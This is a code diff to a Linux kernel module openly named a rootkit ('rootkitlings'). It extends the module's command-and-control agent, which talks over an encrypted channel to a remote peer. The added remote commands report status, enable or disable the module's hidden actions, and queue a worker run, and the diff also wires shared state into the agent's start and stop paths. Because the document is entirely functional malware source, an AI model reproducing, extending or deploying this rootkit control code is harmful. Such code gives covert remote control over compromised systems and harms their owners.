@@ -2,6 +2,7 @@
 #include <linux/err.h>
 #include <linux/errno.h>
 #include <linux/jiffies.h>
+#include <linux/kernel.h>
 #include <linux/kthread.h>
 #include <linux/net.h>
 #include <linux/socket.h>
@@ -10,6 +11,7 @@
 #include <net/net_namespace.h>
 
 #include "agent.h"
+#include "rootkit.h"
 
 static ssize_t rk_socket_send(struct socket *socket,
 			      const unsigned char *bytes, size_t length,
@@ -74,6 +76,11 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 	static const unsigned char error_reply[] = "ERR";
 	static const unsigned char info_reply[] = "INFO rootkitlings";
 	static const unsigned char pong_reply[] = "PONG";
+	static const unsigned char enabled_reply[] = "ENABLED";
+	static const unsigned char disabled_reply[] = "DISABLED";
+	static const unsigned char queued_reply[] = "QUEUED";
+	static const unsigned char busy_reply[] = "ERR busy";
+	static const unsigned char denied_reply[] = "ERR disabled";
 	unsigned char reply[RK_FRAME_MAX];
 	struct rk_command command;
 	size_t reply_length;
@@ -97,6 +104,31 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 	case RK_COMMAND_INFO:
 		return rk_agent_reply(agent, socket, info_reply,
 			      sizeof(info_reply) - 1);
+	case RK_COMMAND_STATUS:
+		reply_length = scnprintf(reply, sizeof(reply), "STATUS %u %lu",
+			rk_state_actions_enabled(agent->state) ? 1U : 0U,
+			rk_state_worker_runs(agent->state));
+		return rk_agent_reply(agent, socket, reply, reply_length);
+	case RK_COMMAND_ENABLE:
+		rk_state_set_actions_enabled(agent->state, true);
+		return rk_agent_reply(agent, socket, enabled_reply,
+			      sizeof(enabled_reply) - 1);
+	case RK_COMMAND_DISABLE:
+		rk_state_set_actions_enabled(agent->state, false);
+		return rk_agent_reply(agent, socket, disabled_reply,
+			      sizeof(disabled_reply) - 1);
+	case RK_COMMAND_RUN:
+		error = rk_worker_request();
+		if (!error)
+			return rk_agent_reply(agent, socket, queued_reply,
+				      sizeof(queued_reply) - 1);
+		if (error == -EAGAIN)
+			return rk_agent_reply(agent, socket, busy_reply,
+				      sizeof(busy_reply) - 1);
+		if (error == -EACCES)
+			return rk_agent_reply(agent, socket, denied_reply,
+				      sizeof(denied_reply) - 1);
+		return error;
 	case RK_COMMAND_MARK:
 		mutex_lock(&agent->lock);
 		memcpy(agent->marker, command.marker, command.marker_length + 1);
@@ -116,6 +148,16 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 
 static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
 {
+	long waited;
+
+	waited = wait_event_interruptible(
+		agent->retry_wait,
+		kthread_should_stop() || READ_ONCE(agent->commands_ready));
+	if (kthread_should_stop())
+		return 0;
+	if (waited)
+		return (int)waited;
+
 	for (;;) {
 		struct rk_frame frame;
 		unsigned char plaintext[RK_SECURE_PLAINTEXT_MAX];
@@ -238,12 +280,13 @@ static int rk_agent_worker(void *argument)
 
 int rk_agent_start(struct rk_agent *agent, u16 peer_port,
 		   unsigned int retry_base_ms, unsigned int retry_max_ms,
-		   const u8 *key, size_t key_length, u64 session)
+		   const u8 *key, size_t key_length, u64 session,
+		   struct rk_state *state)
 {
 	struct task_struct *task;
 	int error;
 
-	if (!agent || !peer_port || !retry_base_ms ||
+	if (!agent || !state || !peer_port || !retry_base_ms ||
 	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
 		return -EINVAL;
 	memset(agent, 0, sizeof(*agent));
@@ -255,15 +298,18 @@ int rk_agent_start(struct rk_agent *agent, u16 peer_port,
 	agent->retry_base_ms = retry_base_ms;
 	agent->retry_max_ms = retry_max_ms;
 	agent->retry_delay_ms = retry_base_ms;
+	agent->state = state;
 	agent->initialized = true;
 	error = rk_secure_channel_start(&agent->secure, key, key_length, session);
 	if (error) {
+		agent->state = NULL;
 		agent->initialized = false;
 		return error;
 	}
 	task = kthread_create(rk_agent_worker, agent, "rkling_agent");
 	if (IS_ERR(task)) {
 		rk_secure_channel_stop(&agent->secure);
+		agent->state = NULL;
 		agent->initialized = false;
 		return PTR_ERR(task);
 	}
@@ -272,6 +318,15 @@ int rk_agent_start(struct rk_agent *agent, u16 peer_port,
 	mutex_unlock(&agent->lock);
 	wake_up_process(task);
 	return 0;
+}
+
+void rk_agent_enable_commands(struct rk_agent *agent)
+{
+	if (!agent || !READ_ONCE(agent->initialized))
+		return;
+
+	WRITE_ONCE(agent->commands_ready, true);
+	wake_up_interruptible(&agent->retry_wait);
 }
 
 void rk_agent_stop(struct rk_agent *agent)
@@ -283,6 +338,8 @@ void rk_agent_stop(struct rk_agent *agent)
 	mutex_lock(&agent->lock);
 	task = agent->task;
 	if (!task) {
+		agent->commands_ready = false;
+		agent->state = NULL;
 		agent->initialized = false;
 		mutex_unlock(&agent->lock);
 		rk_secure_channel_stop(&agent->secure);
@@ -299,6 +356,8 @@ void rk_agent_stop(struct rk_agent *agent)
 	mutex_lock(&agent->lock);
 	agent->task = NULL;
 	agent->connected = false;
+	agent->commands_ready = false;
+	agent->state = NULL;
 	agent->initialized = false;
 	mutex_unlock(&agent->lock);
 	rk_secure_channel_stop(&agent->secure);
